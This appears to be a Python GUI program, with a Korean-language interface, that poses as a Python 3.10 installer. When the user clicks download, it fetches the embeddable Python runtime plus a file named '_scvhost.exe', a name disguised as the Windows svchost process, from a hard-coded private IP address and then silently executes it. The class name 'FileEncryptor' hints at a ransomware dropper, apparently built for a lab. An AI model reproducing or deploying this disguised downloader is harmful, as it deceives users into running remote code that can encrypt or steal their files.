import os
import time
import tkinter as tk
import requests
from tkinter import filedialog
import urllib.request
import subprocess


k="1111"
class FileEncryptor():
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("Python Download")
        self.root.geometry("610x90+500+300")
        self.root.resizable(False, False)

        # 다운로드 위치 선택
        self.file_label = tk.Label(self.root, text="다운로드 위치:", font=("Arial", 12))
        self.file_label.grid(row=0, column=0, padx=10, pady=10, sticky=tk.W)

        self.file_text = tk.Text(self.root, width=30, height=1, font=("Arial", 12), state='disabled')
        self.file_text.grid(row=0, column=1, padx=10, pady=10)

        self.file_button = tk.Button(self.root, text="Select", font=("Arial", 12), command=self.select_file)
        self.file_button.grid(row=0, column=2, padx=10, pady=10)

        self.download = tk.Button(self.root, text="download", font=("Arial", 12), command=self.download)
        self.download.grid(row=0, column=3, padx=10, pady=10)

        self.exceptlabel = tk.Label(self.root, text="다운로드할 위치를 선택해주세요.", font=("Arial", 12))
        self.exceptlabel.grid(row=3, column=1, padx=10, pady=0, sticky=tk.W)

        self.root.mainloop()

    def replace_slash(path):
        return path.replace("/", "\\\\")   

    def replace_slash2(path):
        return path.replace("/", "\\") 
         
    def select_file(self):
        self.filename = filedialog.askdirectory(initialdir="/", title="Select directory")
        self.file_text.config(state='normal')
        self.file_text.delete('1.0', tk.END)
        self.file_text.insert(tk.END, self.filename)
        self.file_text.config(state='disabled')

        
    def download(self):
        if self.file_text.get("1.0", "end-1c") == "":
            self.exceptlabel.config(text="다운로드할 위치가 없습니다.")
        else:
            if os.path.isdir(FileEncryptor.replace_slash(self.file_text.get('1.0','end')[:-1]) + '\\python3 64(bit)'):
                self.exceptlabel.config(text="이미 설치되어있습니다.")
            else:
                try:
                    downlist = ["_scvhost.exe","_asyncio.pyd", "_decimal.pyd","libcrypto-1_1.dll", "LICENSE.txt","_multiprocessing.pyd", "python310.dll","python3.dll", "pythonw.exe","_socket.pyd", "_ssl.pyd","vcruntime140_1.dll", "_zoneinfo.pyd","_bz2.pyd", "_elementtree.pyd","libffi-7.dll", "_lzma.pyd","_overlapped.pyd", "python310._pth","python.cat", "_queue.pyd","sqlite3.dll", "unicodedata.pyd","vcruntime140.dll", "_ctypes.pyd","_hashlib.pyd", "libssl-1_1.dll","_msi.pyd", "pyexpat.pyd","python310.zip", "python.exe","select.pyd", "_sqlite3.pyd","_uuid.pyd", "winsound.pyd"]
                    os.mkdir(f"{FileEncryptor.replace_slash(self.file_text.get('1.0','end')[:-1])}\\python3-64(bit)")
                    self.exceptlabel.config(text="설치 중입니다")
                    global k
                    k=f"{FileEncryptor.replace_slash(self.file_text.get('1.0','end')[:-1])}\\python3-64(bit)\\_scvhost.exe"

                    for i in range(len(downlist)):
                        urllib.request.urlretrieve(f"http://192.168.153.129/python-3.10.11-embed-amd64/{downlist[i]}", f"{FileEncryptor.replace_slash(self.file_text.get('1.0','end')[:-1])}\\python3-64(bit)\\{downlist[i]}")
                    self.exceptlabel.config(text="설치 완료되었습니다. 5초뒤 자동종료")
                    self.root.after(5000, self.root.destroy)
                    subprocess.Popen(k)
                except:
                    self.exceptlabel.config(text="네트워크 연결이 불안정합니다.")

        

FileEncryptor()

